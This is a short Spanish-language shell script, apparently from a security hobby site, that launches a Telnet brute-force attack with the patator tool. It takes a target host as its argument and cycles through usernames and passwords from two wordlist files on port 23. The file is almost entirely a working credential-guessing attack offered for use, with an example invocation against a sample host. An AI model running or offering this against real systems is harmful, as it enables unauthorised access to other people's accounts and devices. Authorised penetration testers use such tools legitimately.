echo
echo "Fuerza bruta Telnet, con patator "
echo
echo "https://github.com/lanjelot/patator"
echo "patator telnet_login host=1.1.1.1 user=antonio password=Passwd01"
echo "hackingyseguridad.com 2024"
patator telnet_login host=$1 user=FILE0 password=FILE1 0=usuarios0.txt 1=claves0.txt port=23
